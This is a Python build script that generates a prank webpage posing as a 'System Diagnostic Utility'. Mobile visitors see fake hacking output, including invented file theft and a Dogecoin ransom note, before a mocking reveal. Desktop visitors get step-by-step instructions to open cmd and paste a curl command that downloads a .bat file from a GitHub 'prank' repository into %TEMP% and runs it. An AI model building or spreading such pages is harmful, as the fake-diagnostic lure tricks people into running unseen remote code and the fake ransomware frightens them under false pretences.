#!/usr/bin/env python3
"""
build_web.py
Compiles index.html with:
1. Exact mobile device detection: iPhone, iPad, Android Phone, Android Tablet, Desktop
2. Upgraded authentic retro cyber terminal with top window chrome, timestamps,
   threatening fake exploit buildup, devastating device roasts, screen twitches, and haptics
3. Desktop experience with verified 1-click terminal command box (Windows CMD & macOS/Linux Bash)
4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
"""

import base64
import glob
import json
import os

MEME_FILES = [
    "10 Funny Versions of Monalisa Trolling the Internet.jpg",
    "45+ Funny History Memes That Aren’t Just For History Buffs.jpg",
    "45036065019418068.jpg",
    "Can’t Believe I Almost Skipped These Historical Gems.jpg",
    "Crazy Funny Pictures.jpg",
    "Dog Meme Look.jpg",
    "Dream.jpg",
    "gif.jpg",
    "Meme Deole.jpg",
    "Meme Pfp Ideas.jpg",
    "Mr bean funny meme.jpg",
    "patrick.jpg",
    "Pitudo Meme.jpg",
    "repost.jpg",
    "Results for quiz I judge ur music taste.jpg",
    "shocked.jpg",
    "What I look like 99% of the time.jpg",
    "WHO.jpg"
]

def load_memes_base64():
    memes_data = []
    for fname in MEME_FILES:
        target_path = None
        for sdir in ["memes", "."]:
            cand = os.path.join(sdir, fname)
            if os.path.exists(cand):
                target_path = cand
                break
            pattern = os.path.join(sdir, fname.replace("’", "*").replace("'", "*"))
            matches = glob.glob(pattern)
            if matches:
                target_path = matches[0]
                break
        if target_path and os.path.exists(target_path):
            with open(target_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
                memes_data.append({
                    "name": os.path.basename(target_path),
                    "data": f"data:image/jpeg;base64,{b64}",
                    "size": os.path.getsize(target_path)
                })
    return memes_data

def build():
    memes = load_memes_base64()
    print(f"Loaded {len(memes)} meme images into memory.")
    memes_json = json.dumps(memes)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Diagnostic Utility</title>
<style>
  * {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-user-select: none;
    user-select: none;
    -webkit-touch-callout: none;
  }}
  html, body {{
    width: 100%;
    height: 100%;
    background-color: #030608;
    color: #00ff66;
    font-family: Consolas, "Cascadia Code", "Liberation Mono", "Courier New", monospace;
    overflow: hidden;
    position: fixed;
  }}

  /* Mobile / Tablet Fullscreen Terminal */
  #mobile-terminal {{
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    height: 100dvh;
    background: #030608;
    color: #00ff66;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    z-index: 99999;
    padding: 0;
  }}

  /* CRT Scanlines */
  #mobile-terminal::before {{
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%),
                linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
    background-size: 100% 3px, 3px 100%;
    pointer-events: none;
    z-index: 20;
  }}

  /* CRT Vignette shadow */
  #mobile-terminal::after {{
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    box-shadow: inset 0 0 70px rgba(0, 0, 0, 0.85);
    pointer-events: none;
    z-index: 21;
  }}

  /* Retro Linux/Hacker Window Header Bar */
  .term-header {{
    position: sticky;
    top: 0;
    left: 0;
    width: 100%;
    height: 38px;
    background: #090e13;
    border-bottom: 1px solid #16241c;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 14px;
    z-index: 30;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.6);
  }}
  .term-dots {{
    display: flex;
    gap: 6px;
    align-items: center;
  }}
  .term-dot {{
    width: 10px;
    height: 10px;
    border-radius: 50%;
  }}
  .dot-red {{ background: #ff5f56; border: 1px solid #e0443e; }}
  .dot-yellow {{ background: #ffbd2e; border: 1px solid #dea123; }}
  .dot-green {{ background: #27c93f; border: 1px solid #1aab29; }}

  .term-title {{
    font-size: 11px;
    color: #4a7558;
    letter-spacing: 0.6px;
    font-weight: bold;
    text-transform: uppercase;
  }}
  .term-badge {{
    font-size: 9px;
    background: rgba(255, 50, 50, 0.15);
    color: #ff4444;
    border: 1px solid rgba(255, 50, 50, 0.4);
    padding: 2px 6px;
    border-radius: 3px;
    font-weight: bold;
    animation: pulseBadge 1.4s infinite;
  }}
  @keyframes pulseBadge {{
    0%, 100% {{ opacity: 1; }}
    50% {{ opacity: 0.35; }}
  }}

  /* Terminal Body Container */
  .term-body {{
    padding: 16px 14px 90px 14px;
    max-width: 680px;
    margin: 0 auto;
    font-size: clamp(13px, 3.8vw, 15px);
    line-height: 1.55;
    letter-spacing: 0.25px;
    word-break: break-word;
    white-space: pre-wrap;
    text-shadow: 0 0 5px rgba(0, 255, 100, 0.35);
  }}
  .line {{
    margin-bottom: 3px;
    word-break: break-word;
  }}
  .line-green {{ color: #00ff66; }}
  .line-red {{ color: #ff3838; font-weight: bold; text-shadow: 0 0 7px rgba(255, 40, 40, 0.55); }}
  .line-yellow {{ color: #ffd228; font-weight: bold; }}
  .line-cyan {{ color: #00d9ff; }}
  .line-white {{ color: #ffffff; font-weight: bold; }}
  .line-dim {{ color: #3e634b; }}
  .line-box {{
    color: #ff3838;
    font-weight: bold;
    background: rgba(255, 0, 0, 0.08);
    padding: 2px 4px;
  }}

  .cursor {{
    display: inline-block;
    width: 8px;
    height: 15px;
    background-color: #00ff66;
    vertical-align: middle;
    margin-left: 2px;
    box-shadow: 0 0 8px rgba(0, 255, 100, 0.7);
    animation: blink 0.75s infinite;
  }}
  @keyframes blink {{
    0%, 49% {{ opacity: 1; }}
    50%, 100% {{ opacity: 0; }}
  }}

  /* Screen Twitch / Glitch */
  .glitch-twitch {{
    animation: twitch 0.12s ease-in-out;
  }}
  @keyframes twitch {{
    0% {{ transform: translate(0, 0); }}
    25% {{ transform: translate(-3px, 1px); }}
    50% {{ transform: translate(3px, -1px); }}
    75% {{ transform: translate(-2px, -1px); }}
    100% {{ transform: translate(0, 0); }}
  }}

  /* Desktop Container */
  #desktop-container {{
    display: none;
    width: 100vw;
    height: 100vh;
    position: relative;
    background: #040608;
  }}
  #desktop-canvas {{
    width: 100%;
    height: 100%;
    display: block;
  }}
  #desktop-launcher {{
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 640px;
    max-width: 92%;
    background: #0a0e13;
    border: 2px solid #00e650;
    padding: 30px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.2);
    text-align: left;
    z-index: 100;
  }}
  .dt-title {{
    font-size: 20px;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .dt-row {{
    font-size: 14px;
    color: #8bb396;
    margin-bottom: 10px;
    line-height: 1.4;
  }}
  .dt-row span.ok {{
    color: #00e650;
  }}
  .os-tabs {{
    display: flex;
    gap: 8px;
    margin-top: 16px;
    margin-bottom: 6px;
  }}
  .os-tab {{
    flex: 1;
    background: #080d0a;
    border: 1px solid #1a3320;
    color: #557760;
    padding: 8px 12px;
    font-family: inherit;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
  }}
  .os-tab.active {{
    background: #0f1c14;
    border-color: #00e650;
    color: #00e650;
    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
  }}
  .cmd-box {{
    background: #040608;
    border: 1px solid #1a3320;
    border-left: 3px solid #00e650;
    color: #00e650;
    font-family: Consolas, "Courier New", monospace;
    font-size: 13px;
    padding: 14px;
    margin: 10px 0 14px 0;
    line-height: 1.4;
    word-break: break-all;
    -webkit-user-select: all;
    user-select: all;
  }}
  .copy-btn {{
    width: 100%;
    background: #0f1c14;
    border: 1px solid #00e650;
    color: #00e650;
    padding: 14px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }}
  .copy-btn:hover {{
    background: #00e650;
    color: #040608;
    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
  }}
  .cmd-hint {{
    margin-top: 14px;
    font-size: 12px;
    color: #72967b;
    line-height: 1.5;
  }}
  .cmd-hint b {{
    color: #00e650;
  }}
</style>
</head>
<body>

<!-- Mobile / Tablet Roaster Terminal -->
<div id="mobile-terminal">
  <!-- Retro Linux/Hacker Window Header -->
  <div class="term-header">
    <div class="term-dots">
      <div class="term-dot dot-red"></div>
      <div class="term-dot dot-yellow"></div>
      <div class="term-dot dot-green"></div>
    </div>
    <div class="term-title" id="term-header-title">root@mobile-node:~ (/bin/exploit)</div>
    <div class="term-badge">● EXPLOIT ACTIVE</div>
  </div>

  <div class="term-body" id="mobile-content">
    <div id="typed-lines"></div>
    <div id="active-line"><span id="current-text"></span><span class="cursor"></span></div>
  </div>
</div>

<!-- Desktop Container -->
<div id="desktop-container">
  <canvas id="desktop-canvas"></canvas>

  <!-- Initial Desktop Verification / Terminal Command Display -->
  <div id="desktop-launcher">
    <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
    <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>

    <!-- OS Selection Tabs -->
    <div class="os-tabs">
      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
    </div>
    
    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" &amp;&amp; "%TEMP%\\launch.bat"</div>

    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>

    <div class="cmd-hint" id="cmd-hint">
      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
    </div>
  </div>
</div>

<script>
// Embedded meme assets
const MEME_ASSETS = {memes_json};

/* ==========================================================================
   DEVICE DETECTION
   ========================================================================== */
function detectDevice() {{
  const ua = navigator.userAgent || '';
  const platform = navigator.platform || '';
  const maxTouchPoints = navigator.maxTouchPoints || 0;

  // 1. iPhone / iPod
  if (/iPhone|iPod/i.test(ua)) {{
    return 'iphone';
  }}

  // 2. iPad: checks classic iPad UA or modern iPadOS reporting as MacIntel/Macintosh with touchpoints
  const isIPadOS = (platform === 'MacIntel' || platform === 'Macintosh' || /Macintosh/i.test(ua)) && maxTouchPoints > 1 && !window.MSStream;
  if (/iPad/i.test(ua) || isIPadOS) {{
    return 'ipad';
  }}

  // 3. Android devices
  if (/Android/i.test(ua)) {{
    if (/Mobile/i.test(ua) || (Math.min(window.screen.width, window.screen.height) < 600 && maxTouchPoints > 0)) {{
      return 'android-phone';
    }} else {{
      return 'android-tablet';
    }}
  }}

  // 4. Other mobile checks
  if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {{
    return 'android-phone';
  }}

  // 5. Desktop / Laptop
  return 'desktop';
}}

/* ==========================================================================
   MOBILE ROAST SCRIPTS & THREATENING / COMEDIC CADENCE
   ========================================================================== */
const IPHONE_SCRIPT = [
  {{ text: "[00:44:01] INITIALIZING REMOTE EXPLOIT PIPELINE...", color: "line-green", speed: 18, pause: 250 }},
  {{ text: "[00:44:02] BYPASSING MOBILE GATEWAY FIREWALL......... [OK]", color: "line-green", speed: 18, pause: 300 }},
  {{ text: "[00:44:03] INJECTING WEAPONIZED KERNEL PAYLOAD....... [OK]", color: "line-green", speed: 18, pause: 350 }},
  {{ text: "[00:44:04] ROOT PRIVILEGES ELEVATED: UID=0 (KERNEL)", color: "line-yellow", speed: 20, pause: 500 }},
  {{ text: "", pause: 200 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "[+] TARGET HARDWARE: APPLE IPHONE", color: "line-red", speed: 22, pause: 600, twitch: true }},
  {{ text: "[+] TELEMETRY:       LOCATION COMPROMISED", color: "line-yellow", speed: 20, pause: 400 }},
  {{ text: "[+] POWER / BATTERY: 14% [DRAINING FASTER THAN YOUR PRIDE]", color: "line-yellow", speed: 20, pause: 450 }},
  {{ text: "[+] STORAGE:         99.8% FULL (14,219 USELESS SCREENSHOTS)", color: "line-yellow", speed: 20, pause: 500 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 200 }},
  {{ text: "[!] SCANNING LOCAL DIRECTORIES FOR EXFILTRATION...", color: "line-red", speed: 22, pause: 400 }},
  {{ text: "[EXFILTRATE] /DCIM/Camera/embarrassing_selfie_v2.jpg ..... [UPLOADED]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /WhatsApp/chat_history_archive.db .......... [EXTRACTED]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /Notes/passwords_dont_open_serious.txt ..... [HELD HOSTAGE]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /Safari/Browsing_History_3AM.db ........... [LEAKED]", color: "line-red", speed: 20, pause: 600, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "╔══════════════════════════════════════════════════════════╗", color: "line-box", speed: 6, pause: 150 }},
  {{ text: "║  ALL YOUR MOBILE DATA HAS BEEN ENCRYPTED (AES-9000).     ║", color: "line-box", speed: 18, pause: 300 }},
  {{ text: "║  SEND 500 DOGECOIN BEFORE WE AUTO-SHARE TO YOUR CONTACTS ║", color: "line-box", speed: 18, pause: 400 }},
  {{ text: "╚══════════════════════════════════════════════════════════╝", color: "line-box", speed: 6, pause: 900, twitch: true }},
  {{ text: "", pause: 400 }},
  {{ text: "...", color: "line-yellow", speed: 120, pause: 1000 }},
  {{ text: "WAIT.", color: "line-white", speed: 40, pause: 900 }},
  {{ text: "HOLD ON.", color: "line-white", speed: 40, pause: 800 }},
  {{ text: "STOP THE ATTACK PROTOCOL.", color: "line-yellow", speed: 30, pause: 900 }},
  {{ text: "", pause: 300 }},
  {{ text: "YOU OPENED THIS ON A PHONE?! 💀", color: "line-red", speed: 38, pause: 1400, twitch: true }},
  {{ text: "ARE YOU SERIOUS RIGHT NOW?", color: "line-white", speed: 35, pause: 900 }},
  {{ text: "", pause: 200 }},
  {{ text: "THIS IS A COMPUTER PRANK.", color: "line-white", speed: 32, pause: 800 }},
  {{ text: "NOT A TIKTOK FILTER.", color: "line-green", speed: 26, pause: 400 }},
  {{ text: "NOT AN INSTAGRAM REEL.", color: "line-green", speed: 26, pause: 400 }},
  {{ text: "NOT A SCREENSHOT.", color: "line-green", speed: 26, pause: 500 }},
  {{ text: "A. COMPUTER. PRANK.", color: "line-white", speed: 45, pause: 1100, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "[MALWARE OPERATOR LOG]", color: "line-cyan", speed: 24, pause: 400 }},
  {{ text: '> Operator 1: "Bro, the victim doesn\'t even have a keyboard."', color: "line-cyan", speed: 28, pause: 700 }},
  {{ text: '> Operator 2: "What do we even encrypt? Their mobile selfies?!"', color: "line-cyan", speed: 28, pause: 700 }},
  {{ text: '> Operator 1: "Abort exploit. This is embarrassing for all of us."', color: "line-cyan", speed: 28, pause: 900 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 250 }},
  {{ text: "MOBILE DEVICE STATUS:", color: "line-white", speed: 26, pause: 450 }},
  {{ text: "❌ INSUFFICIENT CHAOS (Screen too small)", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ INSUFFICIENT KEYBOARD (Typing with thumbs)", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ INSUFFICIENT COMMON SENSE (Clicked unknown link)", color: "line-red", speed: 24, pause: 450 }},
  {{ text: "💀 PANIC LEVEL: 97% (Visibly sweating)", color: "line-yellow", speed: 26, pause: 750, twitch: true }},
  {{ text: "", pause: 300 }},
  {{ text: "CONCLUSION:", color: "line-white", speed: 30, pause: 700 }},
  {{ text: "YOU PAID ALL THAT MONEY FOR AN IPHONE...", color: "line-yellow", speed: 36, pause: 850 }},
  {{ text: "JUST TO GET EXCLUDED AND BULLIED BY A WEBPAGE. 😭", color: "line-red", speed: 42, pause: 1500, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "YOUR FILES ARE 100% SAFE.", color: "line-green", speed: 28, pause: 600 }},
  {{ text: "UNFORTUNATELY, YOUR DIGNITY DID NOT SURVIVE.", color: "line-yellow", speed: 32, pause: 900 }},
  {{ text: "", pause: 250 }},
  {{ text: "NICE TRY, NPC. COME BACK WITH A LAPTOP. 💀", color: "line-white", speed: 36, pause: 1200 }},
  {{ text: "TERMINATING MOBILE SESSION IN 3... 2... 1...", color: "line-dim", speed: 25, pause: 1000 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 45, pause: 4000 }}
];

const ANDROID_PHONE_SCRIPT = [
  {{ text: "[00:44:01] INITIALIZING REMOTE EXPLOIT PIPELINE...", color: "line-green", speed: 18, pause: 250 }},
  {{ text: "[00:44:02] SCANNING ADB / SIDELOAD INTERFACES......... [OK]", color: "line-green", speed: 18, pause: 300 }},
  {{ text: "[00:44:03] INJECTING STAGED APK PAYLOAD.............. [OK]", color: "line-green", speed: 18, pause: 350 }},
  {{ text: "[00:44:04] ROOT ACCESS GRANTED: SELINUX PERMISSIVE", color: "line-yellow", speed: 20, pause: 500 }},
  {{ text: "", pause: 200 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "[+] TARGET HARDWARE: ANDROID PHONE", color: "line-red", speed: 22, pause: 600, twitch: true }},
  {{ text: "[+] SECURITY SUITE:  PLAY PROTECT: CONFUSED & CRYING", color: "line-yellow", speed: 20, pause: 400 }},
  {{ text: "[+] POWER / BATTERY: 14% [DRAINING FASTER THAN YOUR PRIDE]", color: "line-yellow", speed: 20, pause: 450 }},
  {{ text: "[+] STORAGE:         99.8% FULL (47 USELESS CLEANER APPS)", color: "line-yellow", speed: 20, pause: 500 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 200 }},
  {{ text: "[!] TARGETING SENSITIVE DATA STREAMS...", color: "line-red", speed: 22, pause: 400 }},
  {{ text: "[EXFILTRATE] /storage/emulated/0/DCIM/embarrassing_01.jpg .. [UPLOADED]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /data/data/com.whatsapp/databases ............. [EXTRACTED]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /Download/DefinitelyNotVirus.apk .............. [HELD HOSTAGE]", color: "line-red", speed: 20, pause: 350 }},
  {{ text: "[EXFILTRATE] /Chrome/History_3AM.db ........................ [LEAKED]", color: "line-red", speed: 20, pause: 600, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "╔══════════════════════════════════════════════════════════╗", color: "line-box", speed: 6, pause: 150 }},
  {{ text: "║  ALL YOUR MOBILE DATA HAS BEEN ENCRYPTED (AES-9000).     ║", color: "line-box", speed: 18, pause: 300 }},
  {{ text: "║  SEND 500 DOGECOIN BEFORE WE AUTO-SHARE TO YOUR CONTACTS ║", color: "line-box", speed: 18, pause: 400 }},
  {{ text: "╚══════════════════════════════════════════════════════════╝", color: "line-box", speed: 6, pause: 900, twitch: true }},
  {{ text: "", pause: 400 }},
  {{ text: "...", color: "line-yellow", speed: 120, pause: 1000 }},
  {{ text: "WAIT.", color: "line-white", speed: 40, pause: 900 }},
  {{ text: "HOLD ON.", color: "line-white", speed: 40, pause: 800 }},
  {{ text: "NICE TRY, NPC. 💀", color: "line-red", speed: 38, pause: 1300, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "THIS PRANK REQUIRES A REAL COMPUTER.", color: "line-white", speed: 34, pause: 850 }},
  {{ text: "YOUR PHONE IS NOT READY FOR THIS LEVEL OF CHAOS.", color: "line-yellow", speed: 34, pause: 1200 }},
  {{ text: "", pause: 250 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "MOBILE STATUS:", color: "line-white", speed: 24, pause: 400 }},
  {{ text: "❌ KEYBOARD NOT FOUND", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ DESKTOP MODE NOT FOUND", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ COMMON SENSE NOT FOUND", color: "line-red", speed: 28, pause: 650 }},
  {{ text: "💀 PANIC LEVEL: 97%", color: "line-yellow", speed: 26, pause: 750, twitch: true }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 250 }},
  {{ text: "YOU INSTALLED 47 SYSTEM CLEANER APPS...", color: "line-yellow", speed: 34, pause: 850 }},
  {{ text: "AND YOU STILL CLICKED A RANDOM SUSPICIOUS LINK. 😭", color: "line-red", speed: 40, pause: 1400, twitch: true }},
  {{ text: "", pause: 350 }},
  {{ text: "YOUR FILES ARE 100% SAFE.", color: "line-green", speed: 28, pause: 600 }},
  {{ text: "WE'LL PRETEND THIS NEVER HAPPENED.", color: "line-white", speed: 34, pause: 850 }},
  {{ text: "COME BACK WITH A KEYBOARD.", color: "line-white", speed: 34, pause: 850 }},
  {{ text: "TERMINATING MOBILE SESSION...", color: "line-dim", speed: 24, pause: 800 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 45, pause: 4000 }}
];

const IPAD_SCRIPT = [
  {{ text: "[00:44:01] INITIALIZING REMOTE EXPLOIT PIPELINE...", color: "line-green", speed: 18, pause: 250 }},
  {{ text: "[00:44:02] BYPASSING IPADOS SANDBOX................... [OK]", color: "line-green", speed: 18, pause: 300 }},
  {{ text: "[00:44:03] INJECTING TABLET CORRUPTION HOOKS......... [OK]", color: "line-green", speed: 18, pause: 350 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "[+] TARGET HARDWARE: APPLE IPAD", color: "line-red", speed: 22, pause: 600, twitch: true }},
  {{ text: "[+] SCREEN RATIO:    OVERSIZED", color: "line-yellow", speed: 20, pause: 400 }},
  {{ text: "[+] SENSORS:         APPLE PENCIL READY (USELESS HERE)", color: "line-yellow", speed: 20, pause: 500 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 200 }},
  {{ text: "WAIT.", color: "line-white", speed: 45, pause: 850 }},
  {{ text: "BIGGER SCREEN.", color: "line-yellow", speed: 38, pause: 850 }},
  {{ text: "STILL NOT A COMPUTER. 💀", color: "line-red", speed: 45, pause: 1400, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "YOU MADE IT BIGGER...", color: "line-white", speed: 35, pause: 750 }},
  {{ text: "BUT YOU STILL DIDN'T BRING A REAL KEYBOARD.", color: "line-yellow", speed: 40, pause: 1200 }},
  {{ text: "", pause: 250 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "TABLET STATUS:", color: "line-white", speed: 24, pause: 400 }},
  {{ text: "❌ TOO BIG FOR MOBILE", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ TOO SMALL FOR THE SHOW", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ COMMON SENSE NOT FOUND", color: "line-red", speed: 28, pause: 650 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 250 }},
  {{ text: "NICE TRY.", color: "line-white", speed: 32, pause: 750 }},
  {{ text: "COME BACK WITH A REAL COMPUTER. 😭", color: "line-red", speed: 40, pause: 1400, twitch: true }},
  {{ text: "TERMINATING MOBILE SESSION...", color: "line-dim", speed: 24, pause: 700 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 45, pause: 3000 }}
];

const ANDROID_TABLET_SCRIPT = [
  {{ text: "[00:44:01] INITIALIZING REMOTE EXPLOIT PIPELINE...", color: "line-green", speed: 18, pause: 250 }},
  {{ text: "[00:44:02] SCANNING TABLET ARCHITECTURE............... [OK]", color: "line-green", speed: 18, pause: 300 }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "[+] TARGET HARDWARE: ANDROID TABLET", color: "line-red", speed: 22, pause: 600, twitch: true }},
  {{ text: "============================================================", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 200 }},
  {{ text: "ABSOLUTELY NOT.", color: "line-red", speed: 45, pause: 900, twitch: true }},
  {{ text: "YOU MADE IT BIGGER...", color: "line-yellow", speed: 34, pause: 750 }},
  {{ text: "BUT YOU STILL DIDN'T MAKE IT A COMPUTER. 💀", color: "line-white", speed: 40, pause: 1400, twitch: true }},
  {{ text: "", pause: 250 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "TABLET STATUS:", color: "line-white", speed: 24, pause: 400 }},
  {{ text: "❌ INSUFFICIENT CHAOS", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ INSUFFICIENT KEYBOARD", color: "line-red", speed: 24, pause: 350 }},
  {{ text: "❌ INSUFFICIENT COMMON SENSE", color: "line-red", speed: 28, pause: 650 }},
  {{ text: "------------------------------------------------------------", color: "line-dim", speed: 6, pause: 250 }},
  {{ text: "", pause: 250 }},
  {{ text: "NICE TRY.", color: "line-white", speed: 34, pause: 750 }},
  {{ text: "COME BACK WITH A COMPUTER.", color: "line-yellow", speed: 40, pause: 1200 }},
  {{ text: "TERMINATING MOBILE SESSION...", color: "line-dim", speed: 24, pause: 800 }},
  {{ text: "BYE. 👋", color: "line-white", speed: 45, pause: 3000 }}
];

/* ==========================================================================
   PROCEDURAL RETRO AUDIO CLICK GENERATOR
   ========================================================================== */
class MobileKeyAudio {{
  constructor() {{
    this.ctx = null;
  }}
  init() {{
    if (!this.ctx) {{
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) this.ctx = new AudioCtx();
    }}
    if (this.ctx && this.ctx.state === "suspended") {{
      this.ctx.resume();
    }}
  }}
  tick() {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = "square";
      osc.frequency.setValueAtTime(800 + Math.random() * 400, this.ctx.currentTime);
      gain.gain.setValueAtTime(0.04, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.012);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + 0.015);
    }} catch (e) {{}}
  }}
  alert() {{
    if (!this.ctx) return;
    try {{
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = "sawtooth";
      osc.frequency.setValueAtTime(180, this.ctx.currentTime);
      gain.gain.setValueAtTime(0.2, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.25);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + 0.25);
    }} catch (e) {{}}
  }}
}}

/* ==========================================================================
   TYPEWRITER ENGINE FOR MOBILE / TABLET
   ========================================================================== */
function runMobileTerminal(script, deviceType) {{
  const term = document.getElementById("mobile-terminal");
  const desktopCont = document.getElementById("desktop-container");
  const headerTitle = document.getElementById("term-header-title");
  const typedLines = document.getElementById("typed-lines");
  const currentTextSpan = document.getElementById("current-text");
  const content = document.getElementById("mobile-content");

  if (desktopCont) desktopCont.style.display = "none";
  term.style.display = "block";

  if (headerTitle) {{
    headerTitle.textContent = `root@${{deviceType}}:# /bin/exploit_session`;
  }}

  const audio = new MobileKeyAudio();
  const unlockAudio = () => {{
    audio.init();
    window.removeEventListener("touchstart", unlockAudio);
    window.removeEventListener("click", unlockAudio);
  }};
  window.addEventListener("touchstart", unlockAudio, {{ passive: true }});
  window.addEventListener("click", unlockAudio, {{ passive: true }});

  let lineIdx = 0;
  let charIdx = 0;

  function typeChar() {{
    if (lineIdx >= script.length) {{
      return; // Completed, stops mobile prank cleanly
    }}

    const cur = script[lineIdx];
    const text = cur.text || "";

    if (text.length === 0) {{
      // Blank line
      const div = document.createElement("div");
      div.className = "line";
      div.innerHTML = "&nbsp;";
      typedLines.appendChild(div);
      lineIdx++;
      setTimeout(typeChar, cur.pause || 200);
      return;
    }}

    // Trigger twitch / glitch / vibration on alarming lines
    if (charIdx === 0 && cur.twitch) {{
      term.classList.add("glitch-twitch");
      setTimeout(() => term.classList.remove("glitch-twitch"), 150);
      if (navigator.vibrate) {{
        try {{ navigator.vibrate([50, 30, 50]); }} catch(e) {{}}
      }}
      audio.alert();
    }}

    if (charIdx < text.length) {{
      currentTextSpan.textContent = text.substring(0, charIdx + 1);
      currentTextSpan.className = cur.color || "line-green";
      charIdx++;
      if (Math.random() < 0.45) audio.tick();

      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
      setTimeout(typeChar, cur.speed || 22);
    }} else {{
      // Finished current line
      const div = document.createElement("div");
      div.className = "line " + (cur.color || "line-green");
      div.textContent = text;
      typedLines.appendChild(div);
      currentTextSpan.textContent = "";
      charIdx = 0;
      lineIdx++;
      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
